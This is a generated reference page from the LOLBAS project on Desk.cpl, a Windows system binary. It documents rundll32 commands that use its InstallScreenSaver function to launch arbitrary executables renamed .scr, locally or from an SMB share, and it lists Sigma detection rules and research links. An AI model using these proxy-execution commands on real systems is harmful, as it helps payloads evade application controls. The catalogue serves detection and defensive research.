---
title: "Desk.cpl"
framework: "lolbas"
generated: "true"
source_path: "yml/OSLibraries/Desk.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Desk.yml"
build_date: "2026-04-27 19:14:21"
category: "OSLibraries"
aliases:
  - "Desk.cpl"
functions:
  - "Execute"
attack_technique_ids:
  - "T1218.011"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Desktop Settings Control Panel

## Paths

- `C:\Windows\System32\desk.cpl`
- `C:\Windows\SysWOW64\desk.cpl`

## Commands

### 1. Execute

Launch an executable with a .scr extension by calling the InstallScreenSaver function.

```cmd
rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
```

- Use Case: Launch any executable payload, as long as it uses the .scr extension.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 2. Execute

Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.

```cmd
rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
```

- Use Case: Launch any executable payload, as long as it uses the .scr extension.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_new_src_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml

## Resources

- {'Link': 'https://vxug.fakedoma.in/zines/29a/29a7/Articles/29A-7.030.txt'}
- {'Link': 'https://twitter.com/pabraeken/status/998627081360695297'}
- {'Link': 'https://twitter.com/VakninHai/status/1517027824984547329'}
- {'Link': 'https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files'}

## Acknowledgements

- {'Person': 'Rafael S Marques', 'Handle': '@pegabizu'}
- {'Person': 'Pierre-Alexandre Braeken', 'Handle': '@pabraeken'}
- {'Person': 'hai', 'Handle': '@VakninHai'}
- {'Person': 'Christopher Peacock', 'Handle': '@SecurePeacock'}
- {'Person': 'Jose Luis Sanchez', 'Handle': '@Joseliyo_Jstnk'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Desk.yml)
